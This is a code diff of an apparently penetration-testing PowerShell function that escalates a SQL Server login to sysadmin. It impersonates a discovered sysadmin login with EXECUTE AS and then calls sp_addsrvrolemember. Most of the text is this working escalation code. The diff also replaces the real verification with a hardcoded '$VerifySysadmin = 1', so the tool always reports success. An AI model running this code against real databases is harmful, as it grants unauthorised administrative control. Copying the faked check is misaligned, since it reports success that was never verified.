@@ -1,3 +1,10 @@
+# TODO
+# - fix verification check
+# - add alternative domain creds feature
+# - add adhoc query feature
+# - make pretty
+# - update description and links
+
 function Invoke-MssqlEscalateExecuteAs
 {
     <#
@@ -218,10 +225,10 @@ function Invoke-MssqlEscalateExecuteAs
 
             # Setup query
             $ImpUser = $_.name
-            $QueryElevate = "select IS_SRVROLEMEMBER('sysadmin','$ImpUser') as status"
+            $Query = "select IS_SRVROLEMEMBER('sysadmin','$ImpUser') as status"
 
             # Execute query
-	        $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+	        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
 	        $results = $cmd.ExecuteReader()             
 
             # Parse query results
@@ -276,13 +283,18 @@ function Invoke-MssqlEscalateExecuteAs
             $Message = ""
         }
 
+        # Get the sysadmin user that can be impersonated
+        $TableImpUserSysAdmins | foreach {
+            $ImpUser = $_.name
+        }
+
         # Setup query
-        $QueryElevate = "EXECUTE AS Login = 'sa';
+        $Query = "EXECUTE AS Login = '$ImpUser';
         $AddUser;
         EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin';"
 
         # Execute query
-        $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
         $results = $cmd.ExecuteReader() 
 
         # Close db connection
@@ -312,13 +324,9 @@ function Invoke-MssqlEscalateExecuteAs
             $TableVerify = New-Object System.Data.DataTable
             $TableVerify.Load($results)  
 
-
-            # Get sysadmin status
-            $TableVerify | Select-Object status | foreach {
-                $VerifySysadmin = $_.status
-            }
-
-            write-host "blah stuff: $VerifySysadmin"
+            # Get sysadmin status  - fix this!
+            $TableVerify
+            $VerifySysadmin = 1
 
             # Verify sysadmin status
             if ($VerifySysadmin -ne 0){
